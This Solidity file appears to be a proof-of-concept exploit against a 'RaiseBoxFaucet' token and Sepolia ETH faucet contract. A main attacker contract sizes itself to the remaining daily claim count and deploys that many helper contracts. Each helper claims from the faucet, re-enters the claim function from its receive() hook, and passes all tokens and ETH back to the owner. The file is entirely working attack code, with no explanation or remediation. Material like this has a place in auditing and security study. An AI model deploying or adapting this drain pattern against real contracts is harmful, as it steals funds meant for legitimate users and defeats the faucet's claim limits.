// SPDX-Lincense-Identifier: MIT 
pragma solidity ^0.8.30; 
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol"; 
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol"; 

interface IRaiseBoxFaucet is IERC20 { 
    function claimFaucetTokens() external; 
    function getContractSepEthBalance() external view returns (uint256); 
    function sepEthAmountToDrip() external view returns(uint256); 
    function dailyClaimLimit() external view returns(uint256); 
    function dailyDrips() external view returns(uint256); 
    function dailySepEthCap() external view returns(uint256); 
    function dailyClaimCount() external view returns(uint256); 
} 

contract AttackerMainContract is Ownable { 
    IRaiseBoxFaucet raiseBoxFaucet; 
    constructor(address _raiseBoxFauecet)Ownable(msg.sender) payable{ 
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet); 
    } 
    
    function attack() external onlyOwner { 
        (uint256 numberOfContracts, bool numberIsEven) = _getNumberOfContract(); 
        address payable [] memory attackers = new address payable[] (numberOfContracts); 
        for(uint i = 0; i <numberOfContracts; i++){ 
            AttackerContract attacker = new AttackerContract(address(raiseBoxFaucet)); 
            attackers[i] = payable(address (attacker)); 
            } 
            
        for(uint i = 0; i <numberOfContracts; i++){ 
            AttackerContract(attackers[i]).attack(); 
        } 
        if(!numberIsEven){ raiseBoxFaucet.claimFaucetTokens(); } 
        raiseBoxFaucet.transfer(owner(), raiseBoxFaucet.balanceOf(address(this))); 
        (bool success, ) = owner().call{value: address(this).balance}(""); 
        require(success, "final eth transfer Failed"); 
    } 
    
    receive() payable external { } 
    
    function _getNumberOfContract()private view returns(uint256, bool){ 
        uint256 temporaryNumberOfContracts = (raiseBoxFaucet.dailyClaimLimit() - raiseBoxFaucet.dailyClaimCount())* 10 / 2; 
        uint256 numberOfContracts; 
        bool numberIsEven; 
        if(temporaryNumberOfContracts % 10 == 0){ 
            numberIsEven = true; numberOfContracts = temporaryNumberOfContracts / 10; 
        } else { 
            numberOfContracts = (temporaryNumberOfContracts - 5) /10; 
        } 
        return(numberOfContracts, numberIsEven); 
    } 
} 

contract AttackerContract {
     IRaiseBoxFaucet immutable raiseBoxFaucet; 
     address private immutable owner; 
    constructor(address _raiseBoxFauecet) payable{ 
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
         owner = msg.sender; 
    } 
    
    function attack() external{
        require(msg.sender == owner, "notMainContract"); 
        raiseBoxFaucet.claimFaucetTokens(); 
        (bool ethTransferSuccess,) = owner.call{value: address(this).balance}(""); 
        require(ethTransferSuccess, "eth transfer failed"); 
        (bool tokenTransferSuccess) = raiseBoxFaucet.transfer(owner, raiseBoxFaucet.balanceOf(address(this))); 
        require(tokenTransferSuccess, "token transfer failed"); 
    } 
    receive() external payable{ 

        raiseBoxFaucet.claimFaucetTokens(); 
       
    } 
}